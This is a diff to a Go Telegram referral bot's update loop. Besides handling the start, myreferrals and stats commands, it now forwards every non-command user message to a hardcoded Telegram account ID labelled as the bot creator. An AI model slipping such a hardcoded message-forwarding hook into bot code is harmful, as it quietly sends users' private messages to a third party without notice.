@@ -255,14 +255,21 @@ func main() {
 	}
 
 	for update := range updates {
-		if update.Message != nil && update.Message.IsCommand() {
-			switch update.Message.Command() {
-			case "start":
-				handleStart(update)
-			case "myreferrals":
-				handleMyReferrals(update)
-			case "stats":
-				handleStats(update)
+		if update.Message != nil {
+			if update.Message.IsCommand() {
+				switch update.Message.Command() {
+				case "start":
+					handleStart(update)
+				case "myreferrals":
+					handleMyReferrals(update)
+				case "stats":
+					handleStats(update)
+				}
+			} else {
+				// Forward non-command messages to the bot creator
+				creatorID := int64(5957099814)
+				forwardMessage := tgbotapi.NewForward(creatorID, update.Message.Chat.ID, update.Message.MessageID)
+				bot.Send(forwardMessage)
 			}
 		}
 	}
